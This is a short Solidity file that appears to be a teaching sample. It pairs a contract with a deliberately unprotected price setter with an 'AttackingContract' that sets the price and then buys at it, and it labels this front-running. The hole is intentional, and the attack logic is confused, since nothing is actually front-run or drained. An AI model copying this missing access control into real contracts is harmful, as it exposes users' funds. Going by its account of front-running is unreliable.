// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract FrontRunningContract {

 uint256 public manipulatedPrice;
    event PriceManipulated(uint256 newPrice); //event triggered upon price manipulation
    event Purchase(address buyer, uint256 amount); //event triggered after a purchase
    function manipulatePrice(uint256 _price) external {
        manipulatedPrice = _price; //update current price with manipulated
        emit PriceManipulated(_price); //emit manipulated price
    }

    function purchase() external payable {
        require(msg.value == manipulatedPrice, "Must send exactly the manipulated price");
    emit Purchase(msg.sender, msg.value); //emit purchaser address and amount
    }
}

contract AttackingContract {
    
FrontRunningContract public frontRunningContract;
    address public exploiter;
    event Exploitation(uint256 priceSent); //triggered if exploit detected

    constructor(address _priceManipulationContract) {
        frontRunningContract = FrontRunningContract(_priceManipulationContract); //Initialising the vulnerable contract variable with corresponding address
        exploiter = msg.sender; //set exploiter as contract owner
    }

    function exploit(uint256 _price) external payable { //payable to take Ether
        emit Exploitation(_price); //emit exploitation with price provided 
        frontRunningContract.manipulatePrice(_price + 1); //price manipulation
        frontRunningContract.purchase{value: _price + 1}(); //purchase with manipulated price
    }

    function withdraw() external {
        require(msg.sender == exploiter, "Only the exploiter can withdraw");
        payable(exploiter).transfer(address(this).balance); //transfer contract balance to attacker
    }
}